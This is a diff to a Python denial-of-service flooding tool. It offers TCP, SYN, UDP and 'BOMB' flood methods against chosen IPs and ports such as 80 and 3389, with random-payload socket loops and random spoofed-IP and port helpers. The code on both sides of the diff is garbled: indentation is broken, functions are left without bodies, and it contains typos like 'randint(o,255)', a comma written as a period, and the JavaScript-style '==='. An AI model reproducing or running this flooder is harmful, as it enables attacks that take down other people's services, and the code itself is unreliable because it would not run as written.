@@ -18,6 +18,10 @@ logo = """
 \037[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
 """
 
+
+
+
+
 banner = """
 \033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
 \033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
@@ -25,14 +29,14 @@ banner = """
 \033[91m|   TCP    | 80  | 3389 |
 \033[91m|   SYN    | 80  | 3389 |
 \033[91m|   UDP    |17091| 7777 |
-\033[91m| UDP-BOMB |17091| 7777 |
-\033[91m] TCP-BOMB | 80  | 3389 |
+\033[91m| UDPBOMB  |17091| 7777 |
+\033[91m] TCPBOMB  | 80  | 3389 |
 \033[91m|----------|------------|
 """
 
 print(logo)
 print(banner)
-method = str(input("Method (TCP, UDPBOMB, SYN, UDP,TCPBOMB) : "))
+method = str(input("Method (TCP, TCPBOMB, UDP, SYN, UDPBOMB) : "))
 
 def UDP():
     ip = str(input("IP : "))
@@ -68,13 +72,18 @@ def TCP():
 
         s.sendto(data, addr)
         
-def TCPBOMB(): 
-	
+ def TCPBOMBA():
+ 
+ def randproxy():
+     ip = ".".join(map(str, (random.randint(o,255)for _ in range(4)))
+  def randport():
+      port = random.randint(1000.9000)
+      return port
+      
      ip = str(input("IP : ")))
      port = int(input("PORT : "))
      time = int(input("TIME : "))
      
-  def ddos():
       while True:
            data = random._urandom(2048)
            s = socket.socket(socket.AF_INET, socket .SOCK_STREAM)
@@ -89,7 +98,7 @@ def TCPBOMB():
               finally:
                 sock.close
      
-def SYN():
+  def SYN
       
 def randproxy():
     ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
@@ -155,16 +164,16 @@ if __name__ == '__main__':
 	print(logo)
 	print(banner)
 	try:
-		if method == 'TCP':
+          if method == 'TCP':
 			TCP()
-	        elif method == 'SYN':
-	                SYN()
-		elif method == 'UDP':
-			UDP()
-		elif method == 'UDP_BOMB':
-		  UDP_BOMB()
-		elif method === 'TCP-BOMBA':
-		  TCP_BOMBA()
+	  elif method == 'SYN':
+	        SYN()
+	  elif method == 'UDP':
+		UDP()
+	  elif method == 'UDPBOMB':
+              UDPBOMB()
+          elif method === 'TCPBOMB':
+	      TCPBOMB()
 		  
 		else:
 			print("Unknow method: %s" % method)
